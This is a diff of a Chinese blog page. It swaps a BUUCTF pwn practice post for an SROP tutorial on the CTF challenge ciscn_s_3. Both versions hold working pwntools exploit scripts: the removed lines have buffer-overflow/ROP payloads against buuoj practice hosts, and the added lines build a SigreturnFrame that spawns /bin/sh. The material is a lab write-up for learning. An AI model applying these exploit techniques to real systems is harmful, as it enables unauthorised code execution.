@@ -6,25 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yoursite.com">
-  <title>buuctf-pwn刷题 | 欢迎来到我的博客！</title>
+  <title>SROP | 欢迎来到我的博客！</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1、test_your_nc  题解： 123from pwn import *p &#x3D; remote(&quot;node4.buuoj.cn&quot;,28839)p.interactive()  2、rip 直接溢出，注意栈平衡   题解： 1234567891011from pwn import *#p &#x3D; process(&quot;.&#x2F;pwn1&quot;)p &#x3D; remote(&amp;qu">
+  <meta name="description" content="SROP x86参数都是保存在栈上面的， 而 x64 中的前六个参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 中，如果还有更多的参数的话才会保存在栈上。 32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15 改变rax的值可以通过pop rax ret或者read函数（read返回时会将rax赋成读取的字节数）。  Set *addr &amp;#x">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buuctf-pwn刷题">
-<meta property="og:url" content="https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:title" content="SROP">
+<meta property="og:url" content="https://yoursite.com/2023/09/18/SROP/index.html">
 <meta property="og:site_name" content="欢迎来到我的博客！">
-<meta property="og:description" content="1、test_your_nc  题解： 123from pwn import *p &#x3D; remote(&quot;node4.buuoj.cn&quot;,28839)p.interactive()  2、rip 直接溢出，注意栈平衡   题解： 1234567891011from pwn import *#p &#x3D; process(&quot;.&#x2F;pwn1&quot;)p &#x3D; remote(&amp;qu">
+<meta property="og:description" content="SROP x86参数都是保存在栈上面的， 而 x64 中的前六个参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 中，如果还有更多的参数的话才会保存在栈上。 32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15 改变rax的值可以通过pop rax ret或者read函数（read返回时会将rax赋成读取的字节数）。  Set *addr &amp;#x">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230917175722461.png">
-<meta property="og:image" content="https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918165950595.png">
-<meta property="og:image" content="https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918165959788.png">
-<meta property="og:image" content="https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918170608714.png">
-<meta property="og:image" content="https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918170616415.png">
-<meta property="article:published_time" content="2023-09-15T08:55:27.000Z">
-<meta property="article:modified_time" content="2023-09-18T09:06:37.828Z">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230919133510975.png">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918205250352.png">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918205322271.png">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918205433726.png">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918205824784.png">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230918205901928.png">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230919134737096.png">
+<meta property="og:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230919142004043.png">
+<meta property="article:published_time" content="2023-09-18T07:32:56.000Z">
+<meta property="article:modified_time" content="2023-09-19T07:33:40.871Z">
 <meta property="article:author" content="shy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230917175722461.png">
+<meta name="twitter:image" content="https://yoursite.com/2023/09/18/SROP/Users/26645/AppData/Roaming/Typora/typora-user-images/image-20230919133510975.png">
   
     <link rel="alternative" href="/atom.xml" title="欢迎来到我的博客！" type="application/atom+xml">
   
@@ -166,49 +169,68 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-buuctf-pwn刷题" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-SROP" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：122字 | 预计阅读时长：1分钟
+    字数：411字 | 预计阅读时长：2分钟
 </div>
         
   
     <h1 class="article-title" itemprop="name">
-      buuctf-pwn刷题
+      SROP
     </h1>
   
 
         
-        <a href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2023-09-15T08:55:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-15</time>
+        <a href="/2023/09/18/SROP/" class="archive-article-date">
+  	<time datetime="2023-09-18T07:32:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>1、test_your_nc</p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230917175722461.png" alt="image-20230917175722461"></p>
-<p>题解：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28839</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <p>SROP</p>
+<p>x86参数都是保存在栈上面的， 而 x64 中的前六个参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15</p>
+<p>改变rax的值可以通过pop rax ret或者read函数（read返回时会将rax赋成读取的字节数）。</p>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230919133510975.png" alt="image-20230919133510975"></p>
+<p>Set *addr &#x3D; value  给地址赋值  Set $rsp &#x3D; value  给寄存器赋值</p>
+<p>例题：ciscn_s_3</p>
+<p>先获取&#x2F;bin&#x2F;sh\x00的位置。</p>
+<p>先输入aaaaaaaa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search aaaaaaaa</span><br></pre></td></tr></table></figure>
 
-<p>2、rip</p>
-<p>直接溢出，注意栈平衡</p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918165950595.png" alt="image-20230918165950595"></p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918165959788.png" alt="image-20230918165959788"></p>
-<p>题解：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26953</span>)</span><br><span class="line">system_addr = <span class="number">0x401040</span></span><br><span class="line">bin_addr = <span class="number">0x40201B</span> </span><br><span class="line">pop_rdi = <span class="number">0x4011fb</span></span><br><span class="line">ret_addr = <span class="number">0x401198</span></span><br><span class="line">call_system = <span class="number">0x401187</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>  + p64(ret_addr) + p64(pop_rdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918205250352.png" alt="image-20230918205250352"></p>
+<p>获得其地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/8gx 0x7fffffffde10</span><br></pre></td></tr></table></figure>
 
-<p>绕了一下，不过差不多。</p>
-<p>3、warmup_csaw_2016</p>
-<p>给了system函数，直接gets溢出</p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918170608714.png" alt="image-20230918170608714"></p>
-<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918170616415.png" alt="image-20230918170616415"></p>
-<p>题解：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./warmup&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29760</span>)</span><br><span class="line">sys_addr = <span class="number">0x40060D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918205322271.png" alt="image-20230918205322271"></p>
+<p>可以看到后续泄露了一个地址 0x00007fffffffdf38</p>
+<p>计算其和aaaaaaaa地址的偏移得</p>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918205433726.png" alt="image-20230918205433726"></p>
+<p>即0x128</p>
+<p>或者直接调试</p>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918205824784.png" alt="image-20230918205824784"></p>
+<p>binsh地址：0x7fffd6be7ca0</p>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918205901928.png" alt="image-20230918205901928"></p>
+<p>泄漏的地址：0x7fffd6be7dc8</p>
+<p>同样 0x7fffd6be7dc8-0x7fffd6be7ca0&#x3D; 0x128</p>
+<p>找到mov rax，0xf</p>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230919134737096.png" alt="image-20230919134737096"></p>
+<p>syscall &#x3D; 0x400501</p>
+<p>通过SigreturnFrame()构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax 0x59</span></span><br><span class="line"><span class="comment"># rdi &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment"># rsi NULL</span></span><br><span class="line"><span class="comment"># rdx NULL</span></span><br><span class="line">frame1.rax = constants.SYS_execve</span><br><span class="line">frame1.rdi = binsh_addr</span><br><span class="line">frame1.rsi = <span class="number">0</span></span><br><span class="line">frame1.rdx = <span class="number">0</span></span><br><span class="line">frame1.rip = syscall  <span class="comment"># 触发execve</span></span><br></pre></td></tr></table></figure>
 
+<p>相当于执行execve(‘&#x2F;bin&#x2F;sh’, 0, 0)</p>
+<p>payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch =<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal= [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,29614)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(vuln))</span><br><span class="line">syscall = <span class="number">0x0400501</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">payload = (<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">binsh_addr = addr-<span class="number">0x128</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_execve</span><br><span class="line">frame1.rdi = binsh_addr</span><br><span class="line">frame1.rsi = <span class="number">0</span></span><br><span class="line">frame1.rdx = <span class="number">0</span></span><br><span class="line">frame1.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = (<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>) + p64(sigreturn) +p64(syscall) + <span class="built_in">bytes</span>(frame1) + p64(vuln)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>附</p>
+<p><img src="/2023/09/18/SROP/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230919142004043.png" alt="image-20230919142004043"></p>
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></p>
 
       
 
@@ -288,7 +310,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://yoursite.com/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yoursite.com/2023/09/18/SROP/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -302,18 +324,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2023/09/18/SROP/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          SROP
-        
-      </div>
-    </a>
   
-  
-    <a href="/2023/08/06/%E6%8A%A5%E5%91%8A%E7%AC%AC%E4%BA%8C%E7%AF%87How-to-Do-Great-Research/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">报告第二篇How to Do Great Research</div>
+    <a href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">buuctf-pwn刷题</div>
       <i class="icon-circle-right"></i>
     </a>
   
